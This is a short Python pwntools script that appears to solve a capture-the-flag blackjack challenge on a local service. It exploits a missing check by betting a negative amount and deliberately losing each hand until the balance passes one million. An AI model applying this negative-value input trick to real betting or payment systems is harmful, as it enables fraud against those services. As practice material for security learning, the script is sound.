#!/usr/bin/env python

import pwn
import time
import argparse

parser = argparse.ArgumentParser(description="Select a filename.")
parser.add_argument("filename", nargs='?', type=str, help="The name of the file to process")
args = parser.parse_args()

def begin(conn):
  conn.recvuntil(b'(Y/N)')
  conn.send(b'Y\n1\n')

def play(conn):
  needbet = True
  while(True):
    line = conn.recvline()
    if line == b'\n':
      continue
    print(line)
    if b'Cash: $' in line:
      cash = int(line.split(b'$')[1])
      if cash > 1000000:
        break
    if b'Your Total is ' in line:
      hand = int(line.split(b' ')[3])
    if b'The Dealer Has a Total of ' in line:
      dealer = int(line.split(b' ')[6]) 
      bet = int(cash * -1) # Bet a negative number!
      if needbet:
        needbet = False
        print(f'Betting: {bet}')
        conn.sendline(str(bet))
    if b'Please Enter H to Hit or S to Stay.' in line:
      print(f'Cash: {cash}  Game: Hand {hand} vs. Dealer {dealer}')
      conn.sendline(b'H') # Throw the game!
    if b'Please Enter Y for Yes or N for No' in line:
      needbet = True
      print('Continuing')
      conn.sendline(b'Y')
    if b'You cannot bet more money than you have.' in line or b'You Are Bankrupt. Game Over' in line:
      break
  
  
if args.filename:
  conn = pwn.process(f'{args.filename}')
else:
  conn = pwn.remote('127.0.0.1', 9009)

begin(conn)
play(conn)
conn.close()

